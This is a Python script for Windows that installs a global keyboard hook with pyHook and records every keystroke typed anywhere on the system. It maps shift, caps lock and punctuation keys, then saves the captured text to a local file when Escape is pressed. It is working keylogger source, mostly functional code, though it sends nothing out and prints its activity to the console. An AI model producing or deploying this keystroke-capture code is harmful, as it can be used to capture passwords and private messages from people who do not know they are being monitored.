# Available at python version 3.7 only. Because of pyHook library and it is unofficial.
import pythoncom, pyHook # for hooking.
import win32api, win32con # for indicate caps lock state.

SIG_SHIFT = 11
SIG_NEXT_LINE = 12
SIG_EXIT = 13
SIG_ERASE = 14
FILE_NAME = "result.txt"

glob_string = ""
glob_shift = False
# indicates state of caps lock. 0:lower / 1:upper
glob_caps_stat = win32api.GetKeyState(win32con.VK_CAPITAL)

"""
Error
if window name not ascii. 
TypeError: KeyboardSwitch() missing arguments
"""

comb_keys = {
    "Lshift" : SIG_SHIFT,
    "Rshift" : SIG_SHIFT,
    "Tab" : SIG_NEXT_LINE,
    "Return" : SIG_NEXT_LINE,
    "Space" : SIG_NEXT_LINE,
    "Escape" : SIG_EXIT,
    "Back" : SIG_ERASE,
    "Capital" : None,
}
oem = {
"Oem_1" : ";",
"Oem_2" : "/",
"Oem_3" : "`",
"Oem_4" : "[",
"Oem_5" : "\\",
"Oem_6" : "]",
"Oem_7" : "'",
"Oem_Comma" : ",",
"Oem_Period" : ".",
"Oem_Minus" : "-",
"Oem_Plus" : "="
}
special_char = {
    "1" : "!",
    "2" : "@",
    "3" : "#",
    "4" : "$",
    "5" : "%",
    "6" : "^",
    "7" : "&",
    "8" : "*",
    "9" : "(",
    "0" : ")",
    ";" : ":",
    "/" : "?",
    "`" : "~",
    "[" : "{",
    "\\" : "|",
    "]" : "}",
    "'" : '"',
    "," : "<",
    "." : ">",
    "-" : "_",
    "=" : "+"
}


def ProcessComb(signal):
    global glob_shift
    global glob_string

    if signal == SIG_SHIFT:
        glob_shift = True
    elif signal == SIG_NEXT_LINE:
        glob_string += "\n"
    elif signal == SIG_ERASE:
        glob_string = glob_string[:-1]
    elif signal == SIG_EXIT:
        with open("result.txt", "w") as f:
            f.write(glob_string)
        exit()
    return True


def OnKeyboardDown(event):
    global glob_shift
    global glob_string
    key = str(event.Key)
    print(key, "Down")
    if key in comb_keys.keys():
        signal = comb_keys[key]
        ProcessComb(signal)
        return True

    if key in oem : key = oem[key]

    if key.isalpha():
        if not(glob_shift ^ glob_caps_stat): # if not(0:lower / 1:upper)
            key = key.lower()
    elif glob_shift:
        key = special_char[key]

    glob_string += key
# return True to pass event to other handlers.
    return True

# Combination key up event.
def OnKeyboardUp(event):
    global glob_shift
    global glob_string

    key = str(event.Key)
    if key not in comb_keys.keys():
        return True
    if comb_keys[key] == SIG_SHIFT:
        glob_shift = False
    print(key, "Up")
    return True

# create a hook manager.
hm = pyHook.HookManager()
# watch for key down event.
hm.KeyDown = OnKeyboardDown
# watch for key up event.
hm.KeyUp = OnKeyboardUp
# set the hook.
hm.HookKeyboard()
# wait forever.
pythoncom.PumpMessages()
